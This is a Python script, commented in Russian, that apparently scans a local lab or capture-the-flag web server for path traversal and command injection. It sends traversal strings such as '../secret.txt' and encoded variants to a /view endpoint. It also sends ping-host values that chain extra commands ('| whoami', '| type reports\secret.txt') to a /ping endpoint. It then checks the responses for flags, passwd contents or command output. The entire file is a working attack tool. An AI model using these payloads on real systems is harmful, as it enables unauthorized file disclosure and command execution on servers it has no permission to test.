import requests
import sys
import re

if len(sys.argv) != 2:
    print("Использование: python scanner.py http://127.0.0.1:5000")
    sys.exit(1)

base_url = sys.argv[1].rstrip("/")

print(f"Сканер запущен. Проверяем сервер: {base_url}\n")
print("Если ничего не выводится – проверь, запущен ли сервер!\n")

path_vulnerable = False
cmd_vulnerable = False

# ──────────────────────────────────────────
# PATH TRAVERSAL
# ──────────────────────────────────────────
print("=== Path Traversal (чтение файлов) ===")
print("-" * 60)

path_payloads = [
    "secret.txt",           # прямой доступ (должен сработать)
    "../secret.txt",        # выход на уровень выше
    "..%2Fsecret.txt",      # URL-encoded /
    "..%5Csecret.txt",      # URL-encoded \\ (Windows)
    "%2e%2e/secret.txt",    # double encoding
    "....//secret.txt",     # обход простых фильтров
    "..\\secret.txt",       # Windows backslash
]

for payload in path_payloads:
    url = f"{base_url}/view?file={payload}"
    try:
        r = requests.get(url, timeout=5)
        text_preview = r.text[:120].replace("\n", " ")

        verdict = "не найдено"

        if re.search(r"FLAG\{|root:|bin/bash|daemon:", r.text):
            verdict = "✅ УСПЕХ (найдено секретное содержимое)"
            path_vulnerable = True
        elif re.search(r"No such file|Errno 2|не найден", r.text, re.IGNORECASE):
            verdict = "возможно (путь не фильтруется)"
        else:
            verdict = "не найдено"

        print(f"Пробуем: {url}")
        print(f"  → статус: {r.status_code}   длина: {len(r.text)}")
        print(f"  Ответ: {text_preview}")
        print(f"  {'→ ' + verdict}")
        print("-" * 60)

    except Exception as e:
        print(f"Ошибка подключения: {e}\n")

# ──────────────────────────────────────────
# COMMAND INJECTION
# ──────────────────────────────────────────
print("\n=== Command Injection (выполнение команд) ===")
print("-" * 60)

cmd_payloads = [
    "127.0.0.1 | whoami",           # pipe — выполнить whoami
    "127.0.0.1 & whoami",           # фоновый оператор Windows
    "127.0.0.1 && whoami",          # AND-оператор
    "127.0.0.1 | dir reports",      # листинг папки
    "127.0.0.1 | type reports\\secret.txt",   # чтение файла
    "127.0.0.1 | echo INJECTED",    # простая проверка
]

for payload in cmd_payloads:
    url = f"{base_url}/ping?host={payload}"
    try:
        r = requests.get(url, timeout=8)
        text_preview = r.text[:120].replace("\n", " ")

        verdict = "не найдено"

        # Ищем признаки выполнения команды
        if re.search(
            r"INJECTED|FLAG\{|secret\.txt|report\.txt"   # наши маркеры
            r"|[a-zA-Z0-9_\-]+\\[a-zA-Z0-9_\-]+"        # домен\пользователь
            r"|Volume|Directory|<DIR>"                    # вывод dir
            r"|uid=|Linux|bin/bash",                      # Linux-признаки
            r.text
        ):
            verdict = "✅ УСПЕХ (команда выполнена!)"
            cmd_vulnerable = True

        print(f"Пробуем: {url}")
        print(f"  → статус: {r.status_code}   длина: {len(r.text)}")
        print(f"  Ответ: {text_preview}")
        print(f"  → {verdict}")
        print("-" * 60)

    except Exception as e:
        print(f"Ошибка подключения: {e}\n")

# ──────────────────────────────────────────
# ИТОГОВЫЙ ОТЧЁТ
# ──────────────────────────────────────────
print("\n" + "=" * 50)
print("ИТОГОВЫЙ ОТЧЁТ")
print("=" * 50)

if path_vulnerable:
    print("✔ Path Traversal — УЯЗВИМОСТЬ НАЙДЕНА")
else:
    print("✖ Path Traversal — не обнаружена")

if cmd_vulnerable:
    print("✔ Command Injection — УЯЗВИМОСТЬ НАЙДЕНА")
else:
    print("✖ Command Injection — не обнаружена")